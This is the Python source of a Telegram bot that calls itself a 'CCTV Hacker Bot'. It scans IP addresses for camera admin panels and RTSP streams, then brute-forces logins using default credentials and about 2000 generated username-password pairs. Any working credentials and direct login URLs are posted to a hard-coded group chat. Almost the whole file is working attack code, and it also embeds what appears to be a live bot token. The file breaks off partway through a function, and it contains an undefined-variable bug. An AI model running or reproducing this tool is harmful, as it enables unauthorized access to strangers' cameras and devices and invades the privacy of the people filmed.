import os
import asyncio
import socket
import logging
import re
import base64
import random
import string
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)
from aiohttp import ClientSession, ClientTimeout

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.DEBUG
)
logger = logging.getLogger(__name__)

# Conversation states
IP, PORT, VULN_INPUT, VULN_PORT, CHECK_LINK_INPUT = range(5)

# Main admin ID
MAIN_ADMIN_ID = 6972264549

# Common CCTV credentials
CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", ""),
    ("root", "root"),
    ("root", ""),
    ("admin", "666666"),
    ("admin", "password"),
    ("user", "user"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "1234"),
    ("root", "12345"),
    ("user", "12345"),
]

# Base usernames and passwords for brute-forcing
BASE_USERNAMES = ["admin", "root", "user", "guest", "support", "manager", "test", "sysadmin"]
BASE_PASSWORDS = [
    "admin", "12345", "password", "123456", "admin123", "1234", "666666", "password123",
    "adminadmin", "root", "qwerty", "letmein", "welcome", "camera", "security", "000000",
    "111111", "123123", "abc123", "pass123"
]

# Generate 2000 random username-password combos
def generate_random_combos(count=2000):
    combos = [(u, p) for u in BASE_USERNAMES for p in BASE_PASSWORDS]
    while len(combos) < count:
        username = random.choice(BASE_USERNAMES) + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        combos.append((username, password))
    random.shuffle(combos)
    return combos[:count]

BRUTE_COMBOS = generate_random_combos(2000)

# Admin paths
ADMIN_PATHS = [
    "/login", "/admin", "/signin", "/", "/dashboard", "/control", "/wp-admin",
    "/login.php", "/admin/login", "/panel", "/default.html", "/index.html",
    "/home", "/config", "/adminpanel", "/login.asp", "/sysadmin", "/webadmin",
    "/backend", "/admin/index.php"
]

# Common ports
COMMON_PORTS = [80, 443, 8080, 8443]

# Vulnerability database
VULN_DB = {
    "wordpress": {
        "version_pattern": r"WordPress\s*(\d+\.\d+\.\d+)",
        "vulnerable_versions": ["4.9.8", "5.0.0"],
        "cve": "CVE-2019-6715",
        "mitigation": "Update to WordPress 6.0+"
    },
    "default_creds": {
        "check": [("admin", "admin"), ("admin", "password")],
        "cve": "N/A",
        "mitigation": "Change default credentials"
    },
    "config_exposure": {
        "paths": ["/wp-config.php", "/config.php"],
        "cve": "N/A",
        "mitigation": "Restrict file access"
    }
}

# Environment variables
TOKEN = os.getenv("TELEGRAM_TOKEN", "7977504618:AAHo-N5eUPKOGlklZUomqlhJ4-op3t68GSE")
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "-1002522049841")
KEEP_ALIVE_PORT = int(os.getenv("KEEP_ALIVE_PORT", 8080))

def is_valid_ipv4(ip: str) -> bool:
    try:
        parts = ip.split(".")
        if len(parts) != 4:
            return False
        for part in parts:
            num = int(part)
            if num < 0 or num > 255:
                return False
            if len(part) > 1 and part[0] == "0":
                return False
        return True
    except (ValueError, AttributeError):
        return False

def is_authorized_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    if user_id == MAIN_ADMIN_ID:
        return True
    authorized_users = context.bot_data.get("authorized_users", set())
    return user_id in authorized_users

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != MAIN_ADMIN_ID:
        await update.message.reply_text("❌ Only admin can use /add.")
        return
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: /add <user_id>")
        return
    try:
        user_id = int(context.args[0])
        if user_id == MAIN_ADMIN_ID:
            await update.message.reply_text("Cannot add main admin.")
            return
        if "authorized_users" not in context.bot_data:
            context.bot_data["authorized_users"] = set()
        context.bot_data["authorized_users"].add(user_id)
        await update.message.reply_text(f"✅ User {user_id} added.", reply_markup=main_menu_markup())
    except ValueError:
        await update.message.reply_text("Invalid user ID. Use a numeric ID.", reply_markup=main_menu_markup())

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != MAIN_ADMIN_ID:
        await update.message.reply_text("❌ Only admin can use /remove.")
        return
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    try:
        user_id = int(context.args[0])
        if user_id == MAIN_ADMIN_ID:
            await update.message.reply_text("Cannot remove main admin.")
            return
        if "authorized_users" in context.bot_data and user_id in context.bot_data["authorized_users"]:
            context.bot_data["authorized_users"].discard(user_id)
            await update.message.reply_text(f"✅ User {user_id} removed.", reply_markup=main_menu_markup())
        else:
            await update.message.reply_text(f"User {user_id} not found.", reply_markup=main_menu_markup())
    except ValueError:
        await update.message.reply_text("Invalid user ID. Use a numeric ID.", reply_markup=main_menu_markup())

async def reboot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != MAIN_ADMIN_ID:
        await update.message.reply_text("❌ Only admin can use /reboot.")
        return
    await update.message.reply_text("🔄 Rebooting bot... Stopping all tasks.")
    try:
        context.user_data["brute_force_running"] = False
        context.user_data.clear()
        context.bot_data["stop_all"] = True
        await asyncio.sleep(1)
        await context.bot.send_message(
            chat_id=GROUP_CHAT_ID,
            text="🔄 Bot reboot initiated by admin."
        )
        logger.info("Reboot triggered. Exiting process.")
        os._exit(0)
    except Exception as e:
        logger.error(f"Reboot error: {e}")
        await update.message.reply_text(f"❌ Reboot failed: {str(e)}", reply_markup=main_menu_markup())

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.message.reply_text("Contact admin to access the bot.")
        return ConversationHandler.END
    try:
        context.user_data.clear()  # Clear user_data to avoid state conflicts
        keyboard = [
            [InlineKeyboardButton("Hack", callback_data="start_hack")],
            [InlineKeyboardButton("Vuln Scan", callback_data="vuln_scan")],
            [InlineKeyboardButton("Check Link", callback_data="check_link")],
            [InlineKeyboardButton("Status", callback_data="status")],
            [InlineKeyboardButton("Help", callback_data="help")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "🎥 CCTV Hacker Bot! 🚀\nChoose an option to scan or manage devices:",
            reply_markup=reply_markup
        )
        return IP
    except Exception as e:
        logger.error(f"Start command error: {e}")
        await update.message.reply_text(
            "❌ Error starting bot. Try again or contact admin.",
            reply_markup=main_menu_markup()
        )
        return ConversationHandler.END

async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized_user(update, context):
        await update.message.reply_text("Contact admin to access the bot.")
        return
    keyboard = [
        [InlineKeyboardButton("Special Admin Scan", callback_data="special_scan")],
        [InlineKeyboardButton("Brute-Force", callback_data="brute_force")],
        [InlineKeyboardButton("Standard Scan", callback_data="start_hack")],
        [InlineKeyboardButton("Main Menu", callback_data="main_menu")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 Advanced Hack Options:\nChoose a scan type or return to menu:",
        reply_markup=reply_markup
    )

async def start_hack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.callback_query.message.reply_text("Contact admin to access the bot.")
        await update.callback_query.answer()
        return ConversationHandler.END
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Enter device IP to scan (e.g., 192.168.1.1):")
    context.user_data["scan_type"] = "standard"
    return IP

async def special_scan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.callback_query.message.reply_text("Contact admin to access the bot.")
        await update.callback_query.answer()
        return ConversationHandler.END
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Enter device IP to scan (e.g., 192.168.1.1):")
    context.user_data["scan_type"] = "special"
    return IP

async def brute_force_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.callback_query.message.reply_text("Contact admin to access the bot.")
        await update.callback_query.answer()
        return ConversationHandler.END
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Enter device IP to scan (e.g., 192.168.1.1):")
    context.user_data["scan_type"] = "brute"
    return IP

async def vuln_scan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.callback_query.message.reply_text("Contact admin to access the bot.")
        await update.callback_query.answer()
        return ConversationHandler.END
    query = update.callback_query
    await query.answer()
    logger.debug("Vuln Scan callback triggered")
    admin_pages = context.user_data.get("admin_pages", [])
    if admin_pages:
        await vuln_scan(update, context, query.message)
        return ConversationHandler.END
    await query.message.reply_text("Enter URL (e.g., http://192.168.1.1/login) or IP to check for vulnerabilities:")
    context.user_data["scan_type"] = "vuln"
    return VULN_INPUT

async def check_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.callback_query.message.reply_text("Contact admin to access the bot.")
        await update.callback_query.answer()
        return ConversationHandler.END
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Enter a URL or IP to check for admin panel (e.g., http://86.103.65.158:8443/login or 192.168.1.1:80/login):")
    context.user_data["awaiting_checklink"] = True
    return CHECK_LINK_INPUT

async def check_link_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.message.reply_text("Contact admin to access the bot.")
        return ConversationHandler.END
    if not context.user_data.get("awaiting_checklink", False):
        await update.message.reply_text(
            "Use the 'Check Link' button to start this action.",
            reply_markup=main_menu_markup()
        )
        return ConversationHandler.END

    input_text = update.message.text.strip()
    context.user_data["awaiting_checklink"] = False
    logger.debug(f"Check Link input: {input_text}")

    # Normalize input: Add http:// if no scheme, handle direct IP
    if not input_text.startswith(("http://", "https://")):
        input_text = f"http://{input_text}"

    parsed_url = urlparse(input_text)
    logger.debug(f"Parsed URL: scheme={parsed_url.scheme}, netloc={parsed_url.netloc}, hostname={parsed_url.hostname}, port={parsed_url.port}, path={parsed_url.path}")

    # Extract IP and port
    ip = parsed_url.hostname or parsed_url.netloc.split(":")[0]
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    path = parsed_url.path or "/"
    protocol = parsed_url.scheme or "http"
    url = f"{protocol}://{ip}:{port}{path}"
    logger.debug(f"Constructed URL: {url}")

    try:
        is_admin, details = await check_admin_panel(url)
        panel_name = path.strip("/") or "root"

        if is_admin:
            admin_id = f"a{len(context.user_data.get('admin_urls', {})) + 1}"
            context.user_data.setdefault("admin_urls", {})[admin_id] = url
            context.user_data.setdefault("admin_pages", []).append(url)

            keyboard = [
                [InlineKeyboardButton("Start Brute-Force?", callback_data=f"hunt_{ip}_{port}_{admin_id}")],
                [InlineKeyboardButton("Main Menu", callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"✅ **Admin Panel Found**: {panel_name} 🎯\nURL: {url}\nDetails: {', '.join(details)}",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
            try:
                await context.bot.send_message(
                    chat_id=GROUP_CHAT_ID,
                    text=f"✅ **Admin Panel** for {ip}:{port}!\nURL: {url}\nDetails: {', '.join(details)}",
                    parse_mode="Markdown"
                )
                await asyncio.sleep(0.1)
            except Exception as e:
                logger.error(f"Group send error: {e}")
        else:
            keyboard = [
                [InlineKeyboardButton("Visit Page", url=url)],
                [InlineKeyboardButton("Main Menu", callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"❌ No admin panel found at {url}.\nDetails: {', '.join(details)}",
                reply_markup=reply_markup
            )

    except Exception as e:
        logger.error(f"Check link error: {e}")
        await update.message.reply_text(
            f"❌ Error checking URL: {str(e)}",
            reply_markup=main_menu_markup()
        )

    return ConversationHandler.END

async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized_user(update, context):
        await update.callback_query.message.reply_text("Contact admin to access the bot.")
        await update.callback_query.answer()
        return
    query = update.callback_query
    await query.answer()
    logger.debug("Status callback triggered")
    await status(update, context, query.message)

async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.callback_query.message.reply_text("Contact admin to access the bot.")
        await update.callback_query.answer()
        return ConversationHandler.END
    query = update.callback_query
    await query.answer()
    context.user_data.clear()
    keyboard = [
        [InlineKeyboardButton("Hack", callback_data="start_hack")],
        [InlineKeyboardButton("Vuln Scan", callback_data="vuln_scan")],
        [InlineKeyboardButton("Check Link", callback_data="check_link")],
        [InlineKeyboardButton("Status", callback_data="status")],
        [InlineKeyboardButton("Help", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.reply_text(
        "🔙 Back to Main Menu\nChoose an option:", reply_markup=reply_markup
    )
    return IP

async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized_user(update, context):
        await update.callback_query.message.reply_text("Contact admin to access the bot.")
        await update.callback_query.answer()
        return
    query = update.callback_query
    await query.answer()
    keyboard = [[InlineKeyboardButton("Main Menu", callback_data="main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.reply_text(
        "📚 Help - CCTV Hacker Bot\n"
        "1. Hack: Scan IPs/ports\n"
        "2. Vuln Scan: Check vulnerabilities\n"
        "3. Check Link: Test URLs for admin panels\n"
        "4. Status: Bot health\n"
        "5. Inline buttons for actions\n"
        "⚠️ Use ethically!",
        reply_markup=reply_markup
    )

async def vuln_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.message.reply_text("Contact admin to access the bot.")
        return ConversationHandler.END
    input_text = update.message.text.strip()
    logger.debug(f"Vuln scan input: {input_text}")

    if input_text.startswith(("http://", "https://")):
        parsed_url = urlparse(input_text)
        logger.debug(f"Parsed URL: scheme={parsed_url.scheme}, netloc={parsed_url.netloc}, hostname={parsed_url.hostname}, port={parsed_url.port}, path={parsed_url.path}")
        if not parsed_url.hostname:
            netloc = parsed_url.netloc.split(":")[0]
            if is_valid_ipv4(netloc):
                ip = netloc
            else:
                await update.message.reply_text("Invalid URL: No valid IP found!", reply_markup=main_menu_markup())
                return VULN_INPUT
        else:
            ip = parsed_url.hostname
        if not is_valid_ipv4(ip):
            await update.message.reply_text("Invalid IP! Try a valid IPv4 (e.g., 86.103.65.158).", reply_markup=main_menu_markup())
            return VULN_INPUT
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        path = parsed_url.path or "/"
        protocol = parsed_url.scheme
        url = f"{protocol}://{ip}:{port}{path}"
        
        if not await check_port(ip, port):
            await update.message.reply_text(f"❌ Port {port} is closed on {ip}. Try another port:", reply_markup=main_menu_markup())
            return VULN_INPUT
        
        context.user_data["admin_pages"] = [url]
        await vuln_scan(update, context, update.message)
        return ConversationHandler.END
    elif is_valid_ipv4(input_text):
        context.user_data["vuln_ip"] = input_text
        await update.message.reply_text("Enter port(s) for vuln scan (e.g., 80, 80-443, or blank for defaults):")
        return VULN_PORT
    else:
        await update.message.reply_text(
            "Invalid input! Use a URL (e.g., http://86.103.65.158:8443/login) or IP (e.g., 86.103.65.158).",
            reply_markup=main_menu_markup()
        )
        return VULN_INPUT

async def vuln_port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.message.reply_text("Contact admin to access the bot.")
        return ConversationHandler.END
    ip = context.user_data.get("vuln_ip")
    port_input = update.message.text.strip()
    logger.debug(f"Vuln scan port: {port_input}")

    ports_to_scan = COMMON_PORTS
    if port_input:
        try:
            if "-" in port_input:
                start, end = map(int, port_input.split("-"))
                if not (1 <= start <= 65535 and 1 <= end <= 65535):
                    raise ValueError("Ports must be 1-65535.")
                if end < start:
                    raise ValueError("End port must be >= start port.")
                ports = list(range(start, end + 1))
            elif "," in port_input:
                ports = [int(p) for p in port_input.split(",") if p.strip()]
                if not all(1 <= p <= 65535 for p in ports):
                    raise ValueError("Ports must be 1-65535.")
            else:
                port = int(port_input)
                if not (1 <= port <= 65535):
                    raise ValueError("Port must be 1-65535.")
                ports = [port]
            if len(ports) > 100:
                raise ValueError("Too many ports! Max 100 ports allowed.")
            ports_to_scan = ports
        except ValueError as e:
            await update.message.reply_text(
                f"Invalid port: {str(e)}. Use 1-65535 (e.g., 80, 80-443, or 80,443). Try again:",
                reply_markup=main_menu_markup()
            )
            return VULN_PORT

    try:
        admin_pages = []
        for port in ports_to_scan:
            if not await check_port(ip, port):
                continue
            protocols = ["http", "https"] if port in [443, 8443] else ["http"]
            for protocol in protocols:
                for path in ADMIN_PATHS[:5]:
                    url = f"{protocol}://{ip}:{port}{path}"
                    is_admin, _ = await check_admin_panel(url)
                    if is_admin:
                        admin_pages.append(url)

        context.user_data["admin_pages"] = admin_pages
        await vuln_scan(update, context, update.message)
    except Exception as e:
        logger.error(f"Vuln scan error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=main_menu_markup())

    return ConversationHandler.END

async def vuln_scan(update: Update, context: ContextTypes.DEFAULT_TYPE, message=None) -> None:
    if not is_authorized_user(update, context):
        await update.message.reply_text("Contact admin to access the bot.")
        return
    logger.debug("Starting vuln scan")
    admin_pages = context.user_data.get("admin_pages", [])
    if not admin_pages:
        reply_text = "No admin pages found to scan."
        if message:
            await message.reply_text(reply_text, reply_markup=main_menu_markup())
        else:
            await update.message.reply_text(reply_text, reply_markup=main_menu_markup())
        logger.debug("No admin pages found")
        return

    reply_text = "🔍 Scanning for vulnerabilities..."
    if message:
        await message.reply_text(reply_text)
    else:
        await update.message.reply_text(reply_text)
    logger.debug(f"Scanning {len(admin_pages)} admin pages")

    results = []
    semaphore = asyncio.Semaphore(3)

    async def check_vuln(url: str) -> list:
        vulns = []
        async with semaphore:
            try:
                async with ClientSession(timeout=ClientTimeout(total=5)) as session:
                    async with session.get(url, ssl=False, allow_redirects=True) as response:
                        if response.status != 200:
                            vulns.append(f"Error: Status {response.status}")
                            return vulns
                        html = await response.text()
                        if "wordpress" in html.lower():
                            version_match = re.search(VULN_DB["wordpress"]["version_pattern"], html, re.I)
                            if version_match and version_match.group(1) in VULN_DB["wordpress"]["vulnerable_versions"]:
                                vulns.append(
                                    f"⚠️ Vulnerable WordPress {version_match.group(1)} ({VULN_DB['wordpress']['cve']})"
                                    f" - {VULN_DB['wordpress']['mitigation']}"
                                )
                    for username, password in VULN_DB["default_creds"]["check"]:
                        async with session.post(url, data={"username": username, "password": password}, ssl=False) as resp:
                            if resp.status == 200 and "dashboard" in (await resp.text()).lower():
                                vulns.append(
                                    f"⚠️ Default creds work: {username}:{password}"
                                    f" - {VULN_DB['default_creds']['mitigation']}"
                                )
                    for path in VULN_DB["config_exposure"]["paths"]:
                        config_url = url.rsplit("/", 1)[0] + path
                        async with session.get(config_url, ssl=False) as resp:
                            if resp.status == 200 and "db_password" in (await resp.text()).lower():
                                vulns.append(
                                    f"⚠️ Exposed config: {config_url}"
                                    f" - {VULN_DB['config_exposure']['mitigation']}"
                                )
            except Exception as e:
                logger.error(f"Vuln scan error for {url}: {e}")
                vulns.append(f"Error scanning {url}: {str(e)}")
        return vulns

    tasks = [check_vuln(url) for url in admin_pages]
    vuln_results = await asyncio.gather(*tasks, return_exceptions=True)
    for url, vulns in zip(admin_pages, vuln_results):
        if isinstance(vulns, Exception):
            results.append(f"🔍 {url}:\nError: {str(vulns)}")
        elif vulns:
            results.append(f"🔍 {url}:\n" + "\n".join(vulns))
        else:
            results.append(f"🔍 {url}: No vulnerabilities found.")

    reply_text = "\n\n".join(results) or "No vulnerabilities detected."
    if message:
        await message.reply_text(reply_text, parse_mode="Markdown", reply_markup=main_menu_markup())
    else:
        await update.message.reply_text(reply_text, parse_mode="Markdown", reply_markup=main_menu_markup())
    await asyncio.sleep(0.1)
    logger.debug("Vuln scan completed")

async def get_geo(ip: str, context: ContextTypes.DEFAULT_TYPE) -> str:
    if not hasattr(context.user_data, "geo_cache"):
        context.user_data["geo_cache"] = {}
    if ip in context.user_data["geo_cache"]:
        return context.user_data["geo_cache"][ip]
    try:
        async with ClientSession(timeout=ClientTimeout(total=5)) as session:
            async with session.get(f"http://ip-api.com/json/{ip}") as response:
                if response.status == 200:
                    data = await response.json()
                    geo = f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
                    context.user_data["geo_cache"][ip] = geo
                    return geo
                return "Unknown"
    except Exception as e:
        logger.error(f"Geo error for {ip}: {e}")
        return "Unknown"

async def check_admin_panel(url: str) -> tuple[bool, list]:
    details = []
    try:
        async with ClientSession(timeout=ClientTimeout(total=5)) as session:
            async with session.get(url, ssl=False, allow_redirects=True) as response:
                status = response.status
                html = await response.text()
                headers = response.headers

                is_admin = False
                if re.search(r'<form.*?(username|login|email|password).*?>', html, re.I | re.S):
                    is_admin = True
                    details.append("Login form detected")
                keywords = ["username", "password", "login", "admin", "dashboard", "control panel", "sign in"]
                if any(keyword in html.lower() for keyword in keywords):
                    is_admin = True
                    details.append("Admin keywords found")
                server = headers.get("Server", "").lower()
                powered_by = headers.get("X-Powered-By", "").lower()
                if any(sig in server or sig in powered_by for sig in ["apache", "nginx", "wordpress"]):
                    details.append(f"Server: {server or powered_by}")
                if status in [401, 403]:
                    is_admin = True
                    details.append("Unauthorized/Forbidden")

                return is_admin, details or ["No admin indicators"]
    except Exception as e:
        logger.error(f"Check admin panel error: {e}")
        return False, [f"Error: {str(e)}"]

async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.message.reply_text("Contact admin to access the bot.")
        return ConversationHandler.END
    ip = update.message.text.strip()
    logger.debug(f"Received IP: {ip}")
    if not is_valid_ipv4(ip):
        await update.message.reply_text("Invalid IP! Try a valid IPv4 (e.g., 86.103.65.158).", reply_markup=main_menu_markup())
        return IP
    context.user_data["ip"] = ip
    await update.message.reply_text("Enter port(s) to scan (e.g., 80, 80-443, or blank for common ports):")
    return PORT

async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_authorized_user(update, context):
        await update.message.reply_text("Contact admin to access the bot.")
        return ConversationHandler.END
    ip = context.user_data.get("ip")
    port_input = update.message.text.strip()
    scan_type = context.user_data.get("scan_type", "standard")
    logger.debug(f"Received port: {port_input}, scan_type: {scan_type}")

    ports_to_scan = COMMON_PORTS
    if port_input:
        try:
            if "-" in port_input:
                start, end = map(int, port_input.split("-"))
                if not (1 <= start <= 65535 and 1 <= end <= 65535):
                    raise ValueError("Ports must be 1-65535.")
                if end < start:
                    raise ValueError("End port must be >= start port.")
                ports = list(range(start, end + 1))
            elif "," in port_input:
                ports = [int(p) for p in port_input.split(",") if p.strip()]
                if not all(1 <= p <= 65535 for p in ports):
                    raise ValueError("Ports must be 1-65535.")
            else:
                port = int(port_value)
                if not (1 <= port <= 65535):
                    raise ValueError("Port must be 1-65535.")
                ports = [port]
            if len(ports) > 100:
                raise ValueError("Too many ports! Max 100 ports allowed.")
            ports_to_scan = ports
        except ValueError as e:
            await update.message.reply_text(
                f"Invalid port: {str(e)}. Use 1-65535 (e.g., 80, 80-443, or 80,443). Try again:",
                reply_markup=main_menu_markup()
            )
            return PORT

    try:
        results = []
        potential_links = []
        admin_pages = []
        inline_buttons = []
        context.user_data["admin_urls"] = {}

        geo = await get_geo(ip, context)
        geo_text = f"🌍 Location: {geo}\n" if geo != "Unknown" else ""

        for port in ports_to_scan:
            port_results, port_links, port_admin_pages = await hack_cctv(ip, port, scan_type, geo_text)
            results.append(port_results)
            potential_links.extend(port_links)
            admin_pages.extend(port_admin_pages)

            for idx, admin_url in enumerate(port_admin_pages, start=len(context.user_data["admin_urls"]) + 1):
                admin_id = f"a{idx}"
                context.user_data["admin_urls"][admin_id] = admin_url
                path_name = admin_url.split("/")[-1] or "root"
                callback_data = f"hunt_{ip}_{port}_{admin_id}"
                if len(callback_data.encode()) > 64:
                    logger.error(f"Callback data too long: {callback_data}")
                    continue
                inline_buttons.append([
                    InlineKeyboardButton(f"Check {path_name}", url=admin_url),
                    InlineKeyboardButton(f"Start Brute-Force {path_name}", callback_data=callback_data)
                ])

        if potential_links or admin_pages:
            callback_data = f"hunt_{ip}_{ports_to_scan[0]}_all"
            if len(callback_data.encode()) <= 64:
                inline_buttons.append([InlineKeyboardButton("Hunt Password (All)", callback_data=callback_data)])
            else:
                logger.error(f"Callback data too long for Hunt All: {callback_data}")
        inline_buttons.append([InlineKeyboardButton("Main Menu", callback_data="main_menu")])

        reply_markup = InlineKeyboardMarkup(inline_buttons)
        results_text = "\n\n".join(results) or "❌ No results obtained."
        await update.message.reply_text(results_text, reply_markup=reply_markup, parse_mode="Markdown")
        await asyncio.sleep(0.1)

        if admin_pages:
            await update.message.reply_text(
                f"✅ **Admin Pages**:\n" + "\n".join([f"- {url}" for url in admin_pages]),
                reply_markup=main_menu_markup(),
                parse_mode="Markdown"
            )
            await asyncio.sleep(0.1)

        try:
            group_message = f"Results for {ip}\n\n{results_text}"
            if admin_pages:
                group_message += "\n✅ **Admin Pages**:\n" + "\n".join([f"- {url}" for url in admin_pages])
            await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=group_message, parse_mode="Markdown")
            await asyncio.sleep(0.1)
        except Exception as e:
            logger.error(f"Group send error: {e}")

        context.user_data["potential_links"] = potential_links
        context.user_data["admin_pages"] = admin_pages
        context.user_data["brute_force_running"] = False

    except Exception as e:
        logger.error(f"Scan error for {ip}: {e}")
        await update.message.reply_text(
            f"❌ Scan failed: {str(e)}", reply_markup=main_menu_markup(), parse_mode="Markdown"
        )

    return ConversationHandler.END

async def hack_cctv(ip: str, port: int, scan_type: str, geo_text: str) -> tuple[str, list, list]:
    results = [f"📡 Scanning {ip}:{port} ({scan_type})..."]
    if geo_text:
        results.append(geo_text)
    potential_links = []
    admin_pages = []
    open_paths = []
    semaphore = asyncio.Semaphore(5)

    try:
        if not await check_port(ip, port):
            results.append("❌ Port closed.")
            return "\n".join(results), potential_links, admin_pages

        results.append(f"✅ Port {port} open!")
        service = "http" if port in [80, 443, 8080, 8443] else "rtsp"
        results.append(f"Service: {service}")

        async def check_path(protocol: str, path: str) -> tuple[bool, str, list]:
            async with semaphore:
                url = f"{protocol}://{ip}:{port}{path}"
                logger.debug(f"Checking path: {url}")
                try:
                    async with ClientSession(timeout=ClientTimeout(total=5)) as session:
                        async with session.get(url, ssl=False, allow_redirects=True) as response:
                            status = response.status
                            html = await response.text()
                            is_admin, details = await check_admin_panel(url)
                            return is_admin, url, details
                except Exception as e:
                    return False, url, [f"Error: {str(e)}"]

        async def verify_credentials(url: str, username: str, password: str) -> bool:
            try:
                async with ClientSession(timeout=ClientTimeout(total=5)) as session:
                    async with session.post(
                        url,
                        data={"username": username, "password": password},
                        ssl=False,
                        allow_redirects=True
                    ) as response:
                        if response.status != 200:
                            return False
                        html = await response.text()
                        if "login" in html.lower() or "password" in html.lower():
                            return False
                        if response.url.path != urlparse(url).path and any(
                            keyword in response.url.path.lower() for keyword in ["dashboard", "admin", "panel"]
                        ):
                            return True
                        if any(keyword in html.lower() for keyword in ["dashboard", "admin", "welcome"]):
                            return True
                        return False
            except Exception as e:
                logger.error(f"Credential verification error for {url}: {e}")
                return False

        if service == "http" and scan_type in ["standard", "special"]:
            protocols = ["http", "https"] if port in [443, 8443] else ["http"]
            tasks = [check_path(protocol, path) for protocol in protocols for path in ADMIN_PATHS]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            for response in responses:
                if isinstance(response, Exception):
                    results.append(f"❌ Path check error: {str(response)}")
                    continue
                is_admin, url, details = response
                if is_admin:
                    admin_pages.append(url)
                    results.append(f"✅ **Admin Page** 🎯: {url} ({', '.join(details)})")
                else:
                    results.append(f"✅ Path: {url} (No admin)")
                open_paths.append(url.split("/")[-1])

            results.append(f"Paths Checked: {len(open_paths)}/{len(ADMIN_PATHS) * len(protocols)}")

        if service == "rtsp" and scan_type == "standard":
            for username, password in CREDENTIALS:
                rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
                is_valid, error = await validate_rtsp(ip, port, username, password)
                if is_valid:
                    potential_links.append((rtsp_url, username, password))
                    results.append(f"✅ RTSP Success: {username}:{password}")
                else:
                    results.append(f"❌ RTSP Failed: {error}")

        if scan_type == "brute":
            results.append("🔥 Trying 2000+ username-password combos...")
            for username, password in BRUTE_COMBOS[:100]:
                is_valid, error = await validate_rtsp(ip, port, username, password)
                if is_valid:
                    rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
                    potential_links.append((rtsp_url, username, password))
                    results.append(f"🎯 Found: {username}:{password}")
                for path in ADMIN_PATHS:
                    url = f"http://{ip}:{port}{path}"
                    try:
                        async with ClientSession(timeout=ClientTimeout(total=5)) as session:
                            async with session.post(
                                url,
                                data={"username": username, "password": password},
                                ssl=False
                            ) as response:
                                if response.status == 200 and await verify_credentials(url, username, password):
                                    direct_url = f"http://{username}:{password}@{ip}:{port}{path}"
                                    admin_pages.append(url)
                                    results.append(f"🎯 Found Admin: {url} ({username}:{password})\nDirect Login: {direct_url}")
                    except Exception as e:
                        logger.error(f"Brute force error for {url}: {e}")

        results.append("⚠️ Use ethically and legally.")

    except Exception as e:
        logger.error(f"Hack CCTV error for {ip}:{port}: {e}")
        results.append(f"❌ Scan error: {str(e)}")

    return "\n".join(results), potential_links, admin_pages

async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized_user(update, context):
        await update.callback_query.message.reply_text("Contact admin to access the bot.")
        await update.callback_query.answer()
        return
    query = update.callback_query
    await query.answer()
